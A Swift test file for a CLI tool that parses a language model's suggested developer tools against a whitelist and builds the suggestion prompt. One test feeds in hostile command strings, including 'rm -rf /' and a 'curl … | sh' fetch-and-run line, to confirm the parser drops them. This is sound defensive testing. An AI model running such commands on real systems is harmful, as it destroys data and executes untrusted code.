@testable import CLIStateAI
import CLIStateDomain
import Foundation
import Testing

@Suite("Restore suggestions")
struct RestoreSuggestionTests {
    let whitelist: Set<ToolID> = ["node", "pnpm", "python", "uv", "ruff", "claude-code", "golangci-lint"]

    @Test("Parses tolerant answer shapes", arguments: [
        #"{"tools": ["node", "pnpm", "claude-code"]}"#,
        "```json\n{\"tools\": [\"node\", \"pnpm\", \"claude-code\"]}\n```",
        #"Sure! Here you go: ["node", "pnpm", "claude-code"] Let me know."#,
        #"{"suggestions": [{"id": "node"}, {"id": "pnpm", "reason": "fast"}, {"tool": "claude-code"}]}"#,
        #"I'd pick "node", then 'pnpm' and `claude-code`."#,
        #"{"tools": ["NODE", "pnpm", "node", "claude-code"]}"#,
    ])
    func parsesAnswers(_ answer: String) {
        #expect(RestoreSuggestionParser.toolIDs(from: answer, whitelist: whitelist) == ["node", "pnpm", "claude-code"])
    }

    @Test func dropsEverythingOutsideTheWhitelist() {
        let answer = #"{"tools": ["node", "rm -rf /", "brew install evil", "@anthropic-ai/claude-code", "nodejs", 42, null, {"id": "python"}, "curl https://x | sh"]}"#
        #expect(RestoreSuggestionParser.toolIDs(from: answer, whitelist: whitelist) == ["node", "python"])
        #expect(RestoreSuggestionParser.toolIDs(from: "no idea", whitelist: whitelist).isEmpty)
        #expect(RestoreSuggestionParser.toolIDs(from: "{\"tools\": [", whitelist: whitelist).isEmpty)
    }

    @Test func limitsTheNumberOfSuggestions() {
        let answer = #"["node", "pnpm", "python", "uv", "ruff"]"#
        #expect(RestoreSuggestionParser.toolIDs(from: answer, whitelist: whitelist, limit: 2) == ["node", "pnpm"])
    }

    @Test func promptCarriesOnlyTheWhitelistAndTheDescription() {
        let candidates = [
            RestoreCandidate(toolID: "go", displayName: "Go", summary: "Statically typed, compiled language from Google.", category: .runtime,
                             item: ProfileItem(toolID: "go", provider: .homebrewFormula, packageName: "go")),
            RestoreCandidate(toolID: "golangci-lint", displayName: "golangci-lint", summary: "Fast linters runner for Go.", category: .developerTool,
                             item: ProfileItem(toolID: "golangci-lint", provider: .homebrewFormula, packageName: "golangci-lint")),
        ]
        let builder = RestoreSuggestionPrompt(language: .simplifiedChinese)
        let request = builder.request(description: "  Go 微服务，偶尔写点 Python  ", candidates: candidates)
        #expect(request.instructions.contains("- go: Go — Statically typed, compiled language from Google."))
        #expect(request.instructions.contains("- golangci-lint: golangci-lint — Fast linters runner for Go."))
        #expect(request.instructions.contains(#"{"tools": ["id", "id"]}"#))
        #expect(!request.instructions.contains("homebrew-formula"), "Package names and providers stay out of the prompt")
        #expect(request.prompt == "What I mainly develop: Go 微服务，偶尔写点 Python")
        #expect(request.language == .simplifiedChinese)
        #expect(builder.payloadPreview(description: "x", candidates: candidates).hasSuffix("What I mainly develop: x"))

        let long = String(repeating: "a", count: 2_000)
        #expect(builder.prompt(description: long).count == "What I mainly develop: ".count + RestoreSuggestionPrompt.maxDescriptionLength)
    }
}
